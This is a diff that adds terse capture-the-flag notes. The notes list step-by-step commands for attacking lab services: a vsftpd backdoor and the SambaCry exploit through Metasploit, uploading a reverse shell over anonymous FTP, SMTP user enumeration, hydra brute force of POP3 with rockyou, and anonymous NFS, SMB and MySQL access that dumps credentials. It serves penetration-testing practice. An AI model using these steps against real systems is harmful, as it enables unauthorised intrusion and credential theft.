@@ -1,0 +1,76 @@
+FTP EXP: nmap -Pn -sV -A -p 21 <ip>
+notice version and anonymous login
+anonymous login has nothing of use
+msfconsole
+search vsftpd
+use 0
+show options
+set rhost <ip>
+run
+cd /root
+cat flag.txt
+
+can try exploits from github and elsewhere
+
+FTP MIS: nmap -Pn -sV -A -p 21 <ip>
+notice anonymous login
+go in see web folder with read and write permissions
+check web
+try upload and see if accessible
+upload reverse shell
+access it and get connection
+find flag at / and display
+
+smtp: nmap -Pn -sV -A -p 25 --script=smtp-enum-users
+or use metasploit's scanner/smpt/smtp_enum
+
+smb ex: nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <ip>
+search cve
+find that its vulnerable to sambacry
+can choose to use metasploit or github exploit, for ease we use metasploit
+msfconsole
+use exploit/linux/samba/is_known_pipename
+show options
+set rhosts
+run
+find flag at /root
+
+smb mis: nmap -p139,445 -A -sV -Pn <ip>
+smbclient -L <ip> or smbmap -H <ip>
+smbclient //<ip>/Anonymous
+get flag.txt
+
+nfs: nmap --script=nfs-showmount OR showmount -e <ip>
+mount -v -t nfs <ip>:/var/nfs_share /tmp
+find flag in /tmp
+
+pop3: nmap -sV -A -Pn -p 110,995 <ip>
+notice port 110 has SASL(PLAIN)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f <ip> -s 110 pop3
+telnet <ip> 110
+user admin
+pass princesa
+list
+retr 1
+quit
+telnet <ip> 110
+user <username>
+pass password
+list
+retr 1
+get flag
+
+mysql: nmap -sV -A -Pn -p 3306 <ip>
+try connecting as anonymous user
+mysql -h <ip>
+show databases;
+use users;
+show tables;
+select * from credentials;
+exit
+mysql -h <ip> -u admin -p
+show databases;
+use hidden;
+show tables;
+select * from secret;
+get flag
